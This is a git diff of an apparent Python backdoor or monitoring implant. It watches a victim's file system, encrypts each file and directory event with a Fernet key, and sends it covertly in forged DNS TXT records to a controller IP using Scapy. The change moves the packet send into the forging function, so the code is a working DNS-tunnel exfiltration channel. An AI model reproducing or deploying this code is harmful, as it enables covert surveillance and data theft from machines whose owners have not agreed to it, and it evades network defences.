@@ -82,49 +82,45 @@ BLOCK_ENCRYPTION_HANDLER.read_key("data/fernet.key")
 
 # Defining the default event handling code for files.
 def on_created(event):
-    query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Created: {event.src_path}", MONITOR_IDENTIFICATION)
-    send_dns_query(query)
+    forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Created: {event.src_path}", MONITOR_IDENTIFICATION)
 
 def on_deleted(event):
-    query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Deleted: {event.src_path}", MONITOR_IDENTIFICATION)
-    send_dns_query(query)
+    forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Deleted: {event.src_path}", MONITOR_IDENTIFICATION)
 
 def on_modified(event):
-    query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Modified: {event.src_path}", MONITOR_IDENTIFICATION)
-    send_dns_query(query)
+    forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Modified: {event.src_path}", MONITOR_IDENTIFICATION)
 
 def on_moved(event):
-    query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Moved: {event.src_path} --> {event.dest_path}", MONITOR_IDENTIFICATION)
-    send_dns_query(query)
+    forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Moved: {event.src_path} --> {event.dest_path}", MONITOR_IDENTIFICATION)
 
 # This is used for directories.
 def on_any_event_directories(event):
     if event.is_directory:
         if event.event_type == "created":
-            query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Created: {event.src_path}", MONITOR_IDENTIFICATION)
-            send_dns_query(query)
+            forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Created: {event.src_path}", MONITOR_IDENTIFICATION)
+            # send_dns_query(query)
         if event.event_type == "deleted":
-            query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Deleted: {event.src_path}", MONITOR_IDENTIFICATION)
-            send_dns_query(query)
+            forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Deleted: {event.src_path}", MONITOR_IDENTIFICATION)
+            # send_dns_query(query)
         if event.event_type == "modified":
-            query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Modified: {event.src_path}", MONITOR_IDENTIFICATION)
-            send_dns_query(query)
+            forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Modified: {event.src_path}", MONITOR_IDENTIFICATION)
+            # send_dns_query(query)
         if event.event_type == "moved":
-            query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Moved: {event.src_path} --> {event.dest_path}", MONITOR_IDENTIFICATION)
-            send_dns_query(query)
+            forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Moved: {event.src_path} --> {event.dest_path}", MONITOR_IDENTIFICATION)
+            # send_dns_query(query)
     else:
         if event.event_type == "created":
-            query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Created: {event.src_path}", MONITOR_IDENTIFICATION)
-            send_dns_query(query)
+            forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Created: {event.src_path}", MONITOR_IDENTIFICATION)
+            # send_dns_query(query)
         if event.event_type == "deleted":
-            query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Deleted: {event.src_path}", MONITOR_IDENTIFICATION)
-            send_dns_query(query)
+            forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Deleted: {event.src_path}", MONITOR_IDENTIFICATION)
+            # send_dns_query(query)
         if event.event_type == "modified":
-            query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Modified: {event.src_path}", MONITOR_IDENTIFICATION)
-            send_dns_query(query)
+            forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Modified: {event.src_path}", MONITOR_IDENTIFICATION)
+            # send_dns_query(query)
         if event.event_type == "moved":
-            query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Moved: {event.src_path} --> {event.dest_path}", MONITOR_IDENTIFICATION)
-            send_dns_query(query)
+            forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Moved: {event.src_path} --> {event.dest_path}", MONITOR_IDENTIFICATION)
+            # send_dns_query(query)
 
 class FileSystemMonitor():
 
@@ -261,11 +257,13 @@ def forge_dns_query_block(data: str, indentification: int):
             truncated_data = data[bytes_sent:bytes_sent+120]
             bytes_sent += len(truncated_data)
             encrypted_data = BLOCK_ENCRYPTION_HANDLER.encrypt(truncated_data.encode("utf-8"))
+            query = IP(dst=CONTROLLER_IP, id=indentification)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
+            send(query, verbose=0)
     else:
         encrypted_data = BLOCK_ENCRYPTION_HANDLER.encrypt(data.encode("utf-8"))
-    # Forge the DNS packet with data in the text record.
-    query = IP(dst=CONTROLLER_IP, id=indentification)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
-    return query
+        query = IP(dst=CONTROLLER_IP, id=indentification)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
+        send(query, verbose=0)
+    # return query
 
 
 def execute_watch_command(path: str) -> bool:
